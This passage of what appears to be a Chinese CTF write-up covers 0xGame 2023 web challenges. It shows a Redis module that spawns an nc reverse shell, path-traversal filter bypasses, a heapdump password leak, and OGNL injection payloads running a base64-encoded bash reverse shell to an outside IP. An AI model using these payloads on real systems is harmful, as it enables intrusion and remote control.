class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int <span class="title class_">RevShellCommand</span>(<span class="title class_">RedisModuleCtx</span> *ctx, <span class="title class_">RedisModuleString</span> **argv, int argc) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">3</span>) &#123;</span><br><span class="line">size_t cmd_len;</span><br><span class="line">char *ip = <span class="title class_">RedisModule</span>_StringPtrLen(argv[<span class="number">1</span>], &amp;cmd_len);</span><br><span class="line">char *port_s = <span class="title class_">RedisModule</span>_StringPtrLen(argv[<span class="number">2</span>], &amp;cmd_len);</span><br><span class="line">int port = <span class="title function_">atoi</span>(port_s);</span><br><span class="line">        int pid;</span><br><span class="line">char * succ= <span class="string">&quot;+OK&quot;</span>;</span><br><span class="line">pid = <span class="title function_">fork</span>();</span><br><span class="line"><span class="keyword">if</span> (pid || pid == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title class_">RedisModuleString</span> *ret = <span class="title class_">RedisModule</span>_CreateString(ctx, succ, <span class="title function_">strlen</span>(succ));</span><br><span class="line">            <span class="title class_">RedisModule</span>_ReplyWithString(ctx, ret);</span><br><span class="line">    <span class="title class_">RedisModule</span>_FreeString(ctx,ret);</span><br><span class="line"><span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">system</span>(<span class="string">&quot;nc ip port -e sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">RedisModule</span>_WrongArity(ctx);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>起server</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021626577-a776f61a-fa6b-459b-93eb-206490ce58ee.png" alt="img"></p><p>访问1.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021727894-8443bd61-ea91-4f7b-b794-326911629959.png" alt="img"></p><p>恶意服务器会持续通信写入  之前代码没有加quit的话 会一直写入 一次就可以exit出来了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021678146-2a4ed6cb-e8f0-42b8-96f1-15908af21cca.png" alt="img"></p><p>然后访问2.php 加载恶意so文件 反弹shell</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022532071-31554092-63af-4ced-b948-1c312836ed7b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022511568-6c0c449b-443d-4723-bc5d-2855c88e7311.png" alt="img"></p><h2 id="Week-3-GoShop"><a href="#Week-3-GoShop" class="headerlink" title="[Week 3] GoShop"></a>[Week 3] GoShop</h2><p>考点：</p><ul><li>整数溢出</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title class_">BuyHandler</span>(c *gin.<span class="property">Context</span>) &#123;</span><br><span class="line">s := sessions.<span class="title class_">Default</span>(c)</span><br><span class="line">user := users[s.<span class="title class_">Get</span>(<span class="string">&quot;id&quot;</span>).(string)]</span><br><span class="line"></span><br><span class="line">data := <span class="title function_">make</span>(map[string]interface&#123;&#125;)</span><br><span class="line">c.<span class="title class_">ShouldBindJSON</span>(&amp;data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> product *<span class="title class_">Product</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := range products &#123;</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;name&quot;</span>] == v.<span class="property">Name</span> &#123;</span><br><span class="line">product = v</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> product == nil &#123;</span><br><span class="line">c.<span class="title class_">JSON</span>(<span class="number">200</span>, gin.<span class="property">H</span>&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;No such product&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n, _ := strconv.<span class="title class_">Atoi</span>(data[<span class="string">&quot;num&quot;</span>].(string))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="number">0</span> &#123;</span><br><span class="line">c.<span class="title class_">JSON</span>(<span class="number">200</span>, gin.<span class="property">H</span>&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Product num can&#x27;t be negative&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> user.<span class="property">Money</span> &gt;= product.<span class="property">Price</span>*<span class="title function_">int64</span>(<span class="params">n</span>) &#123;</span><br><span class="line">user.<span class="property">Money</span> -= product.<span class="property">Price</span> * <span class="title function_">int64</span>(n)</span><br><span class="line">user.<span class="property">Items</span>[product.<span class="property">Name</span>] += <span class="title function_">int64</span>(n)</span><br><span class="line">c.<span class="title class_">JSON</span>(<span class="number">200</span>, gin.<span class="property">H</span>&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: fmt.<span class="title class_">Sprintf</span>(<span class="string">&quot;Buy %v * %v success&quot;</span>, product.<span class="property">Name</span>, n),</span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.<span class="title class_">JSON</span>(<span class="number">200</span>, gin.<span class="property">H</span>&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;You don&#x27;t have enough money&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接看官方WP吧 <a href="https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/#goshop">0xGame 2023 Web Official Writeup</a></p><p>本人乱点出的qwq</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022685784-17eab509-7c76-46b8-a5bd-08c61069fd8e.png" alt="img"></p><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="Week-4-spring-学习"><a href="#Week-4-spring-学习" class="headerlink" title="[Week 4] spring(学习)"></a>[Week 4] spring(学习)</h2><p>考点：</p><ul><li>Spring Boot Actuator未授权 headdump泄露</li></ul><p>Actutator是一个生产环境部署时可使用的功能，用来监控和管理应用程序。支持选择HTTP Endpoints 或者JMX的方式来访问，同样支持查看应用程序的Auding,health和metrics信息。</p><p>首先访问<code>/actuator/env </code>查看环境变量发现flag是密码 密码被改为星号了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847740633-7aee6a12-a838-4b4c-8942-1c94351320e3.png" alt="img"></p><p>访问<code>/actuator/headdump</code> </p><p>spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防⽌敏感信息泄露 但是我们可以通过 &#x2F;actuator&#x2F;heapdump 这个路由去导出 jvm 中的堆内存信息, 然后通过⼀定的查询得到 app.password 的明文</p><p>这里我用的是MAT工具<a href="https://eclipse.dev/mat/">Eclipse Memory Analyzer Open Source Project | The Eclipse Foundation</a></p><p>查询语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM java.util.LinkedHashMap$Entry x <span class="title function_">WHERE</span><span class="params">(toString(x.key)</span>.contains(<span class="string">&quot;app.password&quot;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847993233-e8c26d8f-cb19-477c-aaa6-f133fbcfc399.png" alt="img"></p><h2 id="Week-4-auth-bypass-学习"><a href="#Week-4-auth-bypass-学习" class="headerlink" title="[Week 4] auth_bypass(学习)"></a>[Week 4] auth_bypass(学习)</h2><p>考点：</p><ul><li>Tomcat Filter绕过+java任意文件下载搭配WEB-INF目录利用</li></ul><p>源码如下：</p><p>AuthFilter.java</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">example</span>.<span class="property">demo</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.*;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">http</span>.<span class="property">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">AuthFilter</span> implements <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">init</span>(<span class="params">FilterConfig filterConfig</span>)  &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">destroy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">doFilter</span>(<span class="title class_">ServletRequest</span> req, <span class="title class_">ServletResponse</span> resp, <span class="title class_">FilterChain</span> chain) throws <span class="title class_">IOException</span>, <span class="title class_">ServletException</span> &#123;</span><br><span class="line">        <span class="title class_">HttpServletRequest</span> request = (<span class="title class_">HttpServletRequest</span>) req;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.<span class="title function_">getRequestURI</span>().<span class="title function_">contains</span>(<span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">            resp.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="string">&quot;blacklist&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.<span class="title function_">getRequestURI</span>().<span class="title function_">startsWith</span>(<span class="string">&quot;/download&quot;</span>)) &#123;</span><br><span class="line">            resp.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="string">&quot;unauthorized access&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.<span class="title function_">doFilter</span>(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DownloadServlet.java</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">example</span>.<span class="property">demo</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">http</span>.<span class="property">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">http</span>.<span class="property">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">http</span>.<span class="property">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">FileInputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HttpServlet</span> &#123;</span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    protected <span class="keyword">void</span> <span class="title function_">doGet</span>(<span class="title class_">HttpServletRequest</span> req, <span class="title class_">HttpServletResponse</span> resp) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> currentPath = <span class="variable language_">this</span>.<span class="title function_">getServletContext</span>().<span class="title function_">getRealPath</span>(<span class="string">&quot;/assets/&quot;</span>);</span><br><span class="line">        <span class="title class_">Object</span> fileNameParameter = req.<span class="title function_">getParameter</span>(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fileNameParameter != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="title class_">String</span> fileName = (<span class="title class_">String</span>) fileNameParameter;</span><br><span class="line">            resp.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+fileName);</span><br><span class="line">            <span class="keyword">try</span> (<span class="title class_">FileInputStream</span> input = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(currentPath + fileName)) &#123;</span><br><span class="line">                byte[] buffer = <span class="keyword">new</span> byte[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">while</span> (input.<span class="title function_">read</span>(buffer) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    resp.<span class="title function_">getOutputStream</span>().<span class="title function_">write</span>(buffer);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.<span class="title function_">setContentType</span>(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            resp.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=\&quot;/download?filename=avatar.jpg\&quot;&gt;avatar.jpg&lt;/a&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单审计就是一个文件读取的功能 并且有blacklist</p><p>首先如何绕过blacklist <code>..</code>和关键字<code>/download</code></p><p>这里利用了java中 getRequestURI()  的缺陷 这个函数在解析url时不会自动进行url解码 也不会进行标准化 (去除多余的<code>/和..</code>)</p><p>参考：<a href="https://www.cnblogs.com/depycode/p/16124191.html">getRequestURI 导致的安全问题 - depycode - 博客园</a></p><p> 以直接访问 <code>//download </code>就能绕过 </p><p>之后目录穿越下载文件的时候可以将<code>..</code> 进行⼀次 url 编码 就能绕过</p><p>所以可以通过 <code>//download?filename=文件 </code>来读取文件 这道题目需要<code>./readflag</code>因此不能直接将flag读出来</p><p>根据题目描述 网站使用war打包 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698850966288-8e5b064d-bdd6-4201-9fbf-a507555dfebd.png" alt="img"></p><p>Tomcat 在部署 war 的时候会将其解压, ⽽压缩包内会存在⼀个 WEB-INF ⽬录, ⽬录⾥⾯包含编译好的 .class ⽂件以及 web.xml (保存路由和类的映射关系 ）</p><p>下载web.xml </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">//download?filename=%2e%2e/WEB-INF/web.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;IndexServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.demo.IndexServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.demo.DownloadServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;EvilServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.demo.EvilServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;IndexServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/download&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;EvilServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/You_Find_This_Evil_Servlet_a76f02cb8422&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;AuthFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;com.example.demo.AuthFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;AuthFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>可以看到EvilServlet类的<code>/You_Find_This_Evil_Servlet_a76f02cb8422</code>路由</p><p> 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class  </span></span><br></pre></td></tr></table></figure><p>再利用JD-GUI工具进行反编译打开</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851238943-8816e84f-6fd8-4cbc-aae1-3b4f8fca29f1.png" alt="img"></p><p>发现命令执行利用点</p><p>利用这个工具生成paylaod <a href="https://www.adminxe.com/tools/code.html">java.lang.Runtime.exec() Payload Workarounds - @Adminxe</a></p><p>记得post打入的时候url全字符编码一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851481677-b3dfcc4a-c183-4962-bef1-09eff8959608.png" alt="img"></p><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851514653-3583acc0-72de-445b-b3ac-02fcbd63e7b7.png" alt="img"></p><h2 id="Week-4-YourBatis-学习"><a href="#Week-4-YourBatis-学习" class="headerlink" title="[Week 4] YourBatis(学习)"></a>[Week 4] YourBatis(学习)</h2><p>考点：</p><ul><li>MyBatis低版本OGNL注入</li><li>OGNL 表达式注入</li></ul><p>首先将给的jar包进行反编译 在idea打开</p><p>首先查看依赖 发现存在MyBatis依赖 并且是低版本2.1.1 该版本存在OGNL表达式注入</p><p>之后开个篇章学习一下 WP就不过多赘述了</p><p>推荐：<a href="https://forum.butian.net/share/1749">奇安信攻防社区-从一道CTF题浅谈MyBatis与Ognl的那些事</a><a href="https://www.cnpanda.net/sec/1227.html">Mybatis 从SQL注入到OGNL注入 - panda | 热爱安全的理想少年</a></p><p>存在一个&#x2F;user路由 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699177350194-f8a3b765-c6f6-43ac-a960-ba1e8243dda6.png" alt="img"></p><p>主要代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">package com.<span class="property">example</span>.<span class="property">yourbatis</span>.<span class="property">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">ibatis</span>.<span class="property">jdbc</span>.<span class="property">SQL</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">UserSqlProvider</span> &#123;</span><br><span class="line">    public <span class="title class_">UserSqlProvider</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">buildGetUsers</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="params"></span>) &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">SELECT</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">FROM</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">buildGetUserByUsername</span>(<span class="params">final <span class="built_in">String</span> username</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="params"></span>) &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">SELECT</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">FROM</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">WHERE</span>(<span class="title class_">String</span>.<span class="title function_">format</span>(<span class="string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到username直接被拼接进了查询语句 因此这里就存在sql注入 更严谨应该是OGNL表达式注入</p><p>直接利用OGNL表达式命令执行反弹shell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.<span class="property">lang</span>.<span class="property">Runtime</span>@<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;bash -c</span></span><br><span class="line"><span class="string">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=&#125;|&#123;base64,-</span></span><br><span class="line"><span class="string">d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>无法进行反弹shell 因为传入的内容包含<code>&#123;和&#125;</code>会被递归解释为另一个OGNL表达式的开头与结尾</p><p>官方wp是利用OGNL 调用Java 自身的 base64 decode方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.<span class="property">lang</span>.<span class="property">Runtime</span>@<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="keyword">new</span></span><br><span class="line">java.<span class="property">lang</span>.<span class="title class_">String</span>(@java.<span class="property">util</span>.<span class="property">Base64</span>@<span class="title function_">getDecoder</span>().<span class="title function_">decode</span>(<span class="string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHpOQzQxTXk4M056YzNJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9&#x27;</span>)))&#125;</span><br></pre></td></tr></table></figure><p>java基础知识还是缺少很多 得去狂补</p><h2 id="Week-4-TestConnection（学习）"><a href="#Week-4-TestConnection（学习）" class="headerlink" title="[Week 4] TestConnection（学习）"></a>[Week 4] TestConnection（学习）</h2><p>考点：</p><ul><li>MySQL &#x2F; PostgreSQL JDBC URL Attack</li></ul><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>直接看官方WP</p><p>JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问</p><p>JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type:&#x2F;&#x2F;host:port&#x2F;db-name?param&#x3D;value</p><p>db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite</p><p>db-name 是要使用的数据库名</p><p>param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等</p><p>当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE</p><p>看看依赖</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186012686-7dcd51eb-5b46-4a88-87ec-b6c194602a72.png" alt="img"></p><p>根据mysql版本8.0.11 找到对应的驱动利用 <a href="https://tttang.com/archive/1877/#toc_">MYSQL JDBC反序列化解析 - 